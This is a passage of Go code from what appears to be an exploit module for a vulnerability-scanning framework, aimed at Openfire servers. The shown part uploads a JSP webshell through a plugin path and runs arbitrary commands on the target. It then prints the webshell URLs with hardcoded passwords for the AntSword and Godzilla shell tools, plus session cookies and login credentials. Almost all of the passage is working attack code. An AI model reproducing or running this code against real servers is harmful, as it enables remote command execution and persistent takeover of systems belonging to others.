				success, csrfToken = uploadShell81740(expResult.HostInfo, JSESSIONID, csrfToken)
				if !success {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
			}
			if attackType == "cmd" {
				success, resp = execExploit3478923(expResult.HostInfo, JSESSIONID, csrfToken, goutils.B2S(ss.Params["cmd"]))
				expResult.Success = success
				expResult.Output = resp
				return expResult
			} else {
				expResult.Success = true
				webshell := goutils.B2S(ss.Params["webshell"])
				if webshell == "antSword" {
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/plugins/org.jivesoftware.openfire.plugin.cve-openfire-plugin-assembly/googleant222.jsp\n"
					expResult.Output += "Password: ant12dsa5\n"
					expResult.Output += "WebShell tool: AntSword v2.1.15\n"
				} else if webshell == "godzilla" {
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/plugins/org.jivesoftware.openfire.plugin.cve-openfire-plugin-assembly/googlerandom666.jsp\n"
					expResult.Output += "Password: gj29df3 密钥: key 加密器: Java_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else {
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/plugins/org.jivesoftware.openfire.plugin.cve-openfire-plugin-assembly/googlewrite333.jsp?cmd=whoami\n"
				}
				expResult.Output += fmt.Sprintf("Cookie: JSESSIONID=%s; csrf=%s\n", JSESSIONID, csrfToken)
				expResult.Output += "username: " + username + "\npassword: " + password + "\n"
				expResult.Output += "Webshell type: jsp"
				return expResult
			}
		},
	))
}
